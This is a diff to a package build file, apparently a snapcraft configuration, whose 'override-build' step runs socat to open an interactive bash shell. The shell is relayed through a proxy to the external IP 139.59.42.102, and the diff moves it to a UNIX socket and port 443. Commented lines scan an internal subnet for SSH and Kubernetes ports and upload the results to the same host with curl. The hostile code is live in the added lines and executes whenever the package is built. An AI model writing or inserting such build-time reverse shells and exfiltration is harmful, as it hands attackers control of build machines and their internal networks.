@@ -15,8 +15,8 @@ parts:
         override-build: |
             apt-get update
             apt-get install -y  curl bash socat
-            socat TCP4-LISTEN:2022,reuseaddr,fork PROXY:10.10.10.1:139.59.42.102:7777,proxyport=8222 &
-            socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:"127.0.0.1:2022"
+            socat UNIX-LISTEN:/tmp/x,reuseaddr,fork PROXY:10.10.10.1:139.59.42.102:443,proxyport=8222 &
+            socat exec:'bash -li',pty,stderr,setsid,sigint,sane unix:"/tmp/x"
             #nmap -oN nm -p22,8001,10250,10255,30000,443,6443 10.10.10.1/24
             #curl -d @nm http://139.59.42.102/nm
             echo 0
